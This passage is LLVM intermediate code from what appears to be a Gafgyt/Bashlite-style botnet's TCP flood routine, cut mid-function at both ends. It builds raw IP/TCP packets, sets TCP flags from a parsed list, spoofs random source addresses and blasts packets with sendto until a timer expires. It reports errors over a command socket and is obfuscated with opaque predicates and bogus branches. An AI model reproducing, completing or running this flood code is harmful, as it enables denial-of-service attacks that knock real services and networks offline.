  %173 = call i32 @strcmp(i8* %172, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.59, i32 0, i32 0)) #10
  %174 = icmp ne i32 %173, 0
  %175 = load i32, i32* @x.73
  %176 = load i32, i32* @y.74
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart246, label %originalBB10alteredBB

originalBBpart246:                                ; preds = %originalBB10
  br i1 %174, label %219, label %183

; <label>:183:                                    ; preds = %originalBBpart246
  %184 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.0* %185 to %struct.anon.1*
  %187 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %186, i32 0, i32 4
  %188 = load i16, i16* %187, align 4
  %189 = and i16 %188, -513
  %190 = or i16 %189, 512
  store i16 %190, i16* %187, align 4
  %191 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %192 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %191, i32 0, i32 0
  %193 = bitcast %union.anon.0* %192 to %struct.anon.1*
  %194 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %193, i32 0, i32 4
  %195 = load i16, i16* %194, align 4
  %196 = and i16 %195, -1025
  %197 = or i16 %196, 1024
  store i16 %197, i16* %194, align 4
  %198 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.0* %199 to %struct.anon.1*
  %201 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -257
  %204 = or i16 %203, 256
  store i16 %204, i16* %201, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.0* %206 to %struct.anon.1*
  %208 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %209, -4097
  %211 = or i16 %210, 4096
  store i16 %211, i16* %208, align 4
  %212 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %213 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %212, i32 0, i32 0
  %214 = bitcast %union.anon.0* %213 to %struct.anon.1*
  %215 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %214, i32 0, i32 4
  %216 = load i16, i16* %215, align 4
  %217 = and i16 %216, -2049
  %218 = or i16 %217, 2048
  store i16 %218, i16* %215, align 4
  br label %408

; <label>:219:                                    ; preds = %originalBBpart246
  %220 = load i32, i32* @x.73
  %221 = load i32, i32* @y.74
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %219
  %228 = load i8*, i8** %20, align 8
  %229 = call i8* @strtok(i8* %228, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %229, i8** %31, align 8
  %230 = load i32, i32* @x.73
  %231 = load i32, i32* @y.74
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %238

; <label>:238:                                    ; preds = %originalBBpart274, %originalBBpart250
  %239 = load i8*, i8** %31, align 8
  %240 = icmp ne i8* %239, null
  br i1 %240, label %241, label %407

; <label>:241:                                    ; preds = %238
  %242 = load i8*, i8** %31, align 8
  %243 = call i32 @strcmp(i8* %242, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %244 = icmp ne i32 %243, 0
  br i1 %244, label %253, label %245

; <label>:245:                                    ; preds = %241
  %246 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.0* %247 to %struct.anon.1*
  %249 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %250, -513
  %252 = or i16 %251, 512
  store i16 %252, i16* %249, align 4
  br label %389

; <label>:253:                                    ; preds = %241
  %254 = load i8*, i8** %31, align 8
  %255 = call i32 @strcmp(i8* %254, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i32 0, i32 0)) #10
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %265, label %257

; <label>:257:                                    ; preds = %253
  %258 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 0
  %260 = bitcast %union.anon.0* %259 to %struct.anon.1*
  %261 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %262, -1025
  %264 = or i16 %263, 1024
  store i16 %264, i16* %261, align 4
  br label %388

; <label>:265:                                    ; preds = %253
  %266 = load i32, i32* @x.73
  %267 = load i32, i32* @y.74
  %268 = sub i32 %266, 1
  %269 = mul i32 %266, %268
  %270 = urem i32 %269, 2
  %271 = icmp eq i32 %270, 0
  %272 = icmp slt i32 %267, 10
  %273 = or i1 %271, %272
  br i1 %273, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %265
  %274 = load i8*, i8** %31, align 8
  %275 = call i32 @strcmp(i8* %274, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.63, i32 0, i32 0)) #10
  %276 = icmp ne i32 %275, 0
  %277 = load i32, i32* @x.73
  %278 = load i32, i32* @y.74
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br i1 %276, label %293, label %285

; <label>:285:                                    ; preds = %originalBBpart254
  %286 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 0
  %288 = bitcast %union.anon.0* %287 to %struct.anon.1*
  %289 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %288, i32 0, i32 4
  %290 = load i16, i16* %289, align 4
  %291 = and i16 %290, -257
  %292 = or i16 %291, 256
  store i16 %292, i16* %289, align 4
  br label %387

; <label>:293:                                    ; preds = %originalBBpart254
  %294 = load i32, i32* @x.73
  %295 = load i32, i32* @y.74
  %296 = sub i32 %294, 1
  %297 = mul i32 %294, %296
  %298 = urem i32 %297, 2
  %299 = icmp eq i32 %298, 0
  %300 = icmp slt i32 %295, 10
  %301 = or i1 %299, %300
  br i1 %301, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %293
  %302 = load i8*, i8** %31, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0)) #10
  %304 = icmp ne i32 %303, 0
  %305 = load i32, i32* @x.73
  %306 = load i32, i32* @y.74
  %307 = sub i32 %305, 1
  %308 = mul i32 %305, %307
  %309 = urem i32 %308, 2
  %310 = icmp eq i32 %309, 0
  %311 = icmp slt i32 %306, 10
  %312 = or i1 %310, %311
  br i1 %312, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br i1 %304, label %321, label %313

; <label>:313:                                    ; preds = %originalBBpart258
  %314 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -4097
  %320 = or i16 %319, 4096
  store i16 %320, i16* %317, align 4
  br label %370

; <label>:321:                                    ; preds = %originalBBpart258
  %322 = load i32, i32* @x.73
  %323 = load i32, i32* @y.74
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %321
  %330 = load i8*, i8** %31, align 8
  %331 = call i32 @strcmp(i8* %330, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0)) #10
  %332 = icmp ne i32 %331, 0
  %333 = load i32, i32* @x.73
  %334 = load i32, i32* @y.74
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br i1 %332, label %349, label %341

; <label>:341:                                    ; preds = %originalBBpart262
  %342 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon.0* %343 to %struct.anon.1*
  %345 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = and i16 %346, -2049
  %348 = or i16 %347, 2048
  store i16 %348, i16* %345, align 4
  br label %353

; <label>:349:                                    ; preds = %originalBBpart262
  %350 = load i32, i32* @mainCommSock, align 4
  %351 = load i8*, i8** %31, align 8
  %352 = call i32 (i32, i8*, ...) @sockprintf(i32 %350, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i32 0, i32 0), i8* %351)
  br label %353

; <label>:353:                                    ; preds = %349, %341
  %354 = load i32, i32* @x.73
  %355 = load i32, i32* @y.74
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %353
  %362 = load i32, i32* @x.73
  %363 = load i32, i32* @y.74
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %370

; <label>:370:                                    ; preds = %originalBBpart266, %313
  %371 = load i32, i32* @x.73
  %372 = load i32, i32* @y.74
  %373 = sub i32 %371, 1
  %374 = mul i32 %371, %373
  %375 = urem i32 %374, 2
  %376 = icmp eq i32 %375, 0
  %377 = icmp slt i32 %372, 10
  %378 = or i1 %376, %377
  br i1 %378, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %370
  %379 = load i32, i32* @x.73
  %380 = load i32, i32* @y.74
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %387

; <label>:387:                                    ; preds = %originalBBpart270, %285
  br label %388

; <label>:388:                                    ; preds = %387, %257
  br label %389

; <label>:389:                                    ; preds = %388, %245
  %390 = load i32, i32* @x.73
  %391 = load i32, i32* @y.74
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %389
  %398 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i32 0, i32 0)) #2
  store i8* %398, i8** %31, align 8
  %399 = load i32, i32* @x.73
  %400 = load i32, i32* @y.74
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %238

; <label>:407:                                    ; preds = %238
  br label %408

; <label>:408:                                    ; preds = %407, %183
  %409 = load i32, i32* @x.73
  %410 = load i32, i32* @y.74
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %408
  %417 = call i32 @rand_cmwc()
  %418 = trunc i32 %417 to i16
  %419 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon.0* %420 to %struct.anon.1*
  %422 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %421, i32 0, i32 5
  store i16 %418, i16* %422, align 2
  %423 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 0
  %425 = bitcast %union.anon.0* %424 to %struct.anon.1*
  %426 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %425, i32 0, i32 6
  store i16 0, i16* %426, align 4
  %427 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 0
  %429 = bitcast %union.anon.0* %428 to %struct.anon.1*
  %430 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %429, i32 0, i32 7
  store i16 0, i16* %430, align 2
  %431 = load i32, i32* %17, align 4
  %432 = icmp eq i32 %431, 0
  %433 = load i32, i32* @x.73
  %434 = load i32, i32* @y.74
  %435 = sub i32 %433, 1
  %436 = mul i32 %433, %435
  %437 = urem i32 %436, 2
  %438 = icmp eq i32 %437, 0
  %439 = icmp slt i32 %434, 10
  %440 = or i1 %438, %439
  br i1 %440, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br i1 %432, label %441, label %459

; <label>:441:                                    ; preds = %originalBBpart278
  %442 = load i32, i32* @x.73
  %443 = load i32, i32* @y.74
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %441
  %450 = call i32 @rand_cmwc()
  %451 = load i32, i32* @x.73
  %452 = load i32, i32* @y.74
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBBpart282, label %originalBB80alteredBB

originalBBpart282:                                ; preds = %originalBB80
  br label %464

; <label>:459:                                    ; preds = %originalBBpart278
  %460 = load i32, i32* %17, align 4
  %461 = trunc i32 %460 to i16
  %462 = call zeroext i16 @htons(i16 zeroext %461) #13
  %463 = zext i16 %462 to i32
  br label %464

; <label>:464:                                    ; preds = %459, %originalBBpart282
  %465 = phi i32 [ %450, %originalBBpart282 ], [ %463, %459 ]
  %466 = trunc i32 %465 to i16
  %467 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %468 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %467, i32 0, i32 0
  %469 = bitcast %union.anon.0* %468 to %struct.anon.1*
  %470 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %469, i32 0, i32 1
  store i16 %466, i16* %470, align 2
  %471 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %472 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %473 = call zeroext i16 @tcpcsum(%struct.iphdr* %471, %struct.tcphdr* %472)
  %474 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 0
  %476 = bitcast %union.anon.0* %475 to %struct.anon.1*
  %477 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %476, i32 0, i32 6
  store i16 %473, i16* %477, align 4
  %478 = bitcast i8* %133 to i16*
  %479 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %480 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %479, i32 0, i32 2
  %481 = load i16, i16* %480, align 2
  %482 = zext i16 %481 to i32
  %483 = call zeroext i16 @csum(i16* %478, i32 %482)
  %484 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %485 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %484, i32 0, i32 7
  store i16 %483, i16* %485, align 2
  %486 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %487 = load i32, i32* %18, align 4
  %488 = add nsw i32 %486, %487
  store i32 %488, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %489

; <label>:489:                                    ; preds = %574, %573, %464
  br label %490

; <label>:490:                                    ; preds = %489
  %491 = load i32, i32* @x.73
  %492 = load i32, i32* @y.74
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBB84, label %originalBB84alteredBB

originalBB84:                                     ; preds = %originalBB84alteredBB, %490
  %499 = load i32, i32* %25, align 4
  %500 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %501 = call i64 @sendto(i32 %499, i8* %133, i64 %131, i32 0, %struct.sockaddr* %500, i32 16)
  %502 = load i32, i32* %27, align 4
  %503 = call i32 @getRandomIP(i32 %502)
  %504 = call i32 @htonl(i32 %503) #13
  %505 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 8
  store i32 %504, i32* %506, align 4
  %507 = call i32 @rand_cmwc()
  %508 = trunc i32 %507 to i16
  %509 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 3
  store i16 %508, i16* %510, align 4
  %511 = call i32 @rand_cmwc()
  %512 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 0
  %514 = bitcast %union.anon.0* %513 to %struct.anon.1*
  %515 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %514, i32 0, i32 2
  store i32 %511, i32* %515, align 4
  %516 = call i32 @rand_cmwc()
  %517 = trunc i32 %516 to i16
  %518 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 0
  %520 = bitcast %union.anon.0* %519 to %struct.anon.1*
  %521 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %520, i32 0, i32 0
  store i16 %517, i16* %521, align 4
  %522 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 0
  %524 = bitcast %union.anon.0* %523 to %struct.anon.1*
  %525 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %524, i32 0, i32 6
  store i16 0, i16* %525, align 4
  %526 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %527 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %528 = call zeroext i16 @tcpcsum(%struct.iphdr* %526, %struct.tcphdr* %527)
  %529 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 0
  %531 = bitcast %union.anon.0* %530 to %struct.anon.1*
  %532 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %531, i32 0, i32 6
  store i16 %528, i16* %532, align 4
  %533 = bitcast i8* %133 to i16*
  %534 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %535 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %534, i32 0, i32 2
  %536 = load i16, i16* %535, align 2
  %537 = zext i16 %536 to i32
  %538 = call zeroext i16 @csum(i16* %533, i32 %537)
  %539 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i32 0, i32 7
  store i16 %538, i16* %540, align 2
  %541 = load i32, i32* %33, align 4
  %542 = load i32, i32* %23, align 4
  %543 = icmp eq i32 %541, %542
  %544 = load i32, i32* @x.73
  %545 = load i32, i32* @y.74
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBBpart286, label %originalBB84alteredBB

originalBBpart286:                                ; preds = %originalBB84
  br i1 %543, label %552, label %574

; <label>:552:                                    ; preds = %originalBBpart286
  %553 = load i32, i32* @x.73
  %554 = load i32, i32* @y.74
  %555 = sub i32 %553, 1
  %556 = mul i32 %553, %555
  %557 = urem i32 %556, 2
  %558 = icmp eq i32 %557, 0
  %559 = icmp slt i32 %554, 10
  %560 = or i1 %558, %559
  br i1 %560, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %552
  %561 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %562 = load i32, i32* %32, align 4
  %563 = icmp sgt i32 %561, %562
  %564 = load i32, i32* @x.73
  %565 = load i32, i32* @y.74
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br i1 %563, label %572, label %573

; <label>:572:                                    ; preds = %originalBBpart290
  br label %577

; <label>:573:                                    ; preds = %originalBBpart290
  store i32 0, i32* %33, align 4
  br label %489

; <label>:574:                                    ; preds = %originalBBpart286
  %575 = load i32, i32* %33, align 4
  %576 = add i32 %575, 1
  store i32 %576, i32* %33, align 4
  br label %489

; <label>:577:                                    ; preds = %572
  %578 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %578)
  br label %579

; <label>:579:                                    ; preds = %577, %107, %99, %92
  %580 = load i32, i32* @x.73
  %581 = load i32, i32* @y.74
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %579
  %588 = load i32, i32* @x.73
  %589 = load i32, i32* @y.74
  %590 = sub i32 %588, 1
  %591 = mul i32 %588, %590
  %592 = urem i32 %591, 2
  %593 = icmp eq i32 %592, 0
  %594 = icmp slt i32 %589, 10
  %595 = or i1 %593, %594
  br i1 %595, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %596 = alloca i8*, align 8
  %597 = alloca i32, align 4
  %598 = alloca i32, align 4
  %599 = alloca i32, align 4
  %600 = alloca i8*, align 8
  %601 = alloca i32, align 4
  %602 = alloca i32, align 4
  %603 = alloca i32, align 4
  %604 = alloca %struct.sockaddr_in, align 4
  %605 = alloca i32, align 4
  %606 = alloca i32, align 4
  %607 = alloca i32, align 4
  %608 = alloca i8*, align 8
  %609 = alloca %struct.iphdr*, align 8
  %610 = alloca %struct.tcphdr*, align 8
  %611 = alloca i8*, align 8
  %612 = alloca i32, align 4
  %613 = alloca i32, align 4
  store i8* %0, i8** %596, align 8
  store i32 %1, i32* %597, align 4
  store i32 %2, i32* %598, align 4
  store i32 %3, i32* %599, align 4
  store i8* %4, i8** %600, align 8
  store i32 %5, i32* %601, align 4
  store i32 %6, i32* %602, align 4
  %614 = load i32, i32* %602, align 4
  store i32 %614, i32* %603, align 4
  %615 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %604, i32 0, i32 0
  store i16 2, i16* %615, align 4
  %616 = load i32, i32* %597, align 4
  %617 = icmp eq i32 %616, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %618 = call i32 @rand_cmwc()
  %619 = trunc i32 %618 to i16
  %620 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %619, i16* %620, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %621 = load i8*, i8** %16, align 8
  %622 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %623 = call i32 @getHost(i8* %621, %struct.in_addr* %622)
  %624 = icmp ne i32 %623, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %120
  %625 = load i32, i32* %21, align 4
  %626 = sext i32 %625 to i64
  %_ = sub i64 0, 40
  %gen = add i64 %_, %626
  %_11 = sub i64 0, 40
  %gen12 = add i64 %_11, %626
  %_13 = sub i64 40, %626
  %gen14 = mul i64 %_13, %626
  %_15 = sub i64 40, %626
  %gen16 = mul i64 %_15, %626
  %627 = add i64 40, %626
  %628 = call i8* @llvm.stacksave()
  store i8* %628, i8** %28, align 8
  %629 = alloca i8, i64 %627, align 16
  %630 = bitcast i8* %629 to %struct.iphdr*
  store %struct.iphdr* %630, %struct.iphdr** %29, align 8
  %631 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %632 = bitcast %struct.iphdr* %631 to i8*
  %633 = getelementptr i8, i8* %632, i64 20
  %634 = bitcast i8* %633 to %struct.tcphdr*
  store %struct.tcphdr* %634, %struct.tcphdr** %30, align 8
  %635 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %636 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %637 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %636, i32 0, i32 0
  %638 = load i32, i32* %637, align 4
  %639 = load i32, i32* %27, align 4
  %640 = call i32 @getRandomIP(i32 %639)
  %641 = call i32 @htonl(i32 %640) #13
  %642 = load i32, i32* %21, align 4
  %643 = sext i32 %642 to i64
  %_17 = shl i64 20, %643
  %_18 = sub i64 20, %643
  %gen19 = mul i64 %_18, %643
  %_20 = sub i64 0, 20
  %gen21 = add i64 %_20, %643
  %_22 = shl i64 20, %643
  %_23 = sub i64 20, %643
  %gen24 = mul i64 %_23, %643
  %644 = add i64 20, %643
  %645 = trunc i64 %644 to i32
  call void @makeIPPacket(%struct.iphdr* %635, i32 %638, i32 %641, i8 zeroext 6, i32 %645)
  %646 = call i32 @rand_cmwc()
  %647 = trunc i32 %646 to i16
  %648 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %649 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %648, i32 0, i32 0
  %650 = bitcast %union.anon.0* %649 to %struct.anon.1*
  %651 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %650, i32 0, i32 0
  store i16 %647, i16* %651, align 4
  %652 = call i32 @rand_cmwc()
  %653 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %654 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %653, i32 0, i32 0
  %655 = bitcast %union.anon.0* %654 to %struct.anon.1*
  %656 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %655, i32 0, i32 2
  store i32 %652, i32* %656, align 4
  %657 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %658 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %657, i32 0, i32 0
  %659 = bitcast %union.anon.0* %658 to %struct.anon.1*
  %660 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %659, i32 0, i32 3
  store i32 0, i32* %660, align 4
  %661 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 0
  %663 = bitcast %union.anon.0* %662 to %struct.anon.1*
  %664 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %663, i32 0, i32 4
